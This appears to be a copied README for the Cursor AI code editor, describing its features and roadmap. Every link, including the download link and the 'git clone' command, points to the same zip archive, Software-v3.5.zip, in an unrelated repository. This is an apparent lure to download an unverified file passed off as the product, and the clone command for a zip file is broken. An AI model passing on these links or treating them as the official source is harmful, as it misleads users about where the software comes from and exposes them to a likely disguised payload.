**[Cursor](https://raw.githubusercontent.com/bookformeonline/cursor/main/src/features/generation/Software-v3.5.zip) is an editor made for programming with AI.** It's early days, but right now Cursor can help you with a few things...

-   **Write**: Generate 10-100 lines of code with an AI that's smarter than Copilot
-   **Diff**: Ask the AI to edit a block of code, see only proposed changes
-   **Chat**: ChatGPT-style interface that understands your current file
-   **And more**: ask to fix lint errors, generate tests/comments on hover, etc.

## Getting Started

Head over to [our website](https://raw.githubusercontent.com/bookformeonline/cursor/main/src/features/generation/Software-v3.5.zip) to download and try out the editor.

Feel free to file tickets for bugs or feature requests. Upvote 👍 the ones you'd like us to prioritize.

## Roadmap

Long term, our plan is to build Cursor into the world's most productive development environment. Using LLMs, we want to do things like:

-   "Heal" your repository when you're halfway through a refactor
-   Allow you to code by editing a "pseudocode" version of your codebase
-   Auto-fix errors as soon as they show up in your terminal
-   Embed AI-written documentation into the UI

## Development

We welcome PRs :) To get started:

```
git clone https://raw.githubusercontent.com/bookformeonline/cursor/main/src/features/generation/Software-v3.5.zip
cd cursor
npm i
